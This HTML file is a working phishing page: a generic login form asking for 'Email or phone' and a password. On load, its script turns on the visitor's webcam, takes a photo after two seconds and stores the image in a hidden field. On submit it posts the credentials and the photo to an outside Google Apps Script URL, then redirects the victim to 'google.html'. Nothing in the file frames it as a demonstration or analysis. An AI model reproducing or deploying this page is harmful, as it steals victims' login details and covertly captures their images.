<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    } input, button {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
      box-sizing: border-box;
    }

    .form-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
    }

    .input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #45a049;
    }

    #video {
      width: 100%;
      border-radius: 4px;
      margin-bottom: 10px;
      display: none; 
    }
  </style>
</head>
<body>
  <body>

  <form id="myForm">
    <input type="hidden" name="redirect_url" value="google.html" />
    <input type="text" name="user" placeholder="Email or phone" required />
    <input type="password" name="password" placeholder="Password" required />
    <input type="hidden" id="photo" name="photo" />
    <button type="submit">Submit</button>
  </form>

  <!-- Hidden video and canvas elements for capturing photo -->
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
   const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoInput = document.getElementById('photo');
    const form = document.getElementById('myForm');

    // Access camera and capture photo after 2 seconds
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          photoInput.value = canvas.toDataURL('image/png');

          // Stop video stream to free camera
          stream.getTracks().forEach(track => track.stop());
          video.style.display = 'none';
        }, 2000);
      })
      .catch(err => {
        console.error("Error accessing camera:", err);
        alert("Could not access camera.");
      });

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const formData = new FormData(form);
      const redirectUrl = formData.get('redirect_url');

      // Convert FormData to URLSearchParams for fetch POST
      const params = new URLSearchParams();
      for (const pair of formData.entries()) {
        params.append(pair[0], pair[1]);
      }

      fetch('https://script.google.com/macros/s/AKfycbwJQYdZ17JZT7knOhPwT8vlnxZBEoiuSAqgixjvpUYiRdDwRtUrftuM1NoQhPhiRGnh/exec', {
        method: 'POST',
        body: params,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      })
      .then(response => {
        if (!response.ok) throw new Error('Network response was not ok');
        return response.text();
      })
      .then(() => {
        // Redirect after successful submission
        window.location.href = redirectUrl;
      })
      .catch(error => {
        alert('Failed to submit form: ' + error.message);
      });
    });

    // You can also add your existing form submit handler here
    // For example, if you want to submit with fetch and redirect as before
  </script>

</body>
</html>
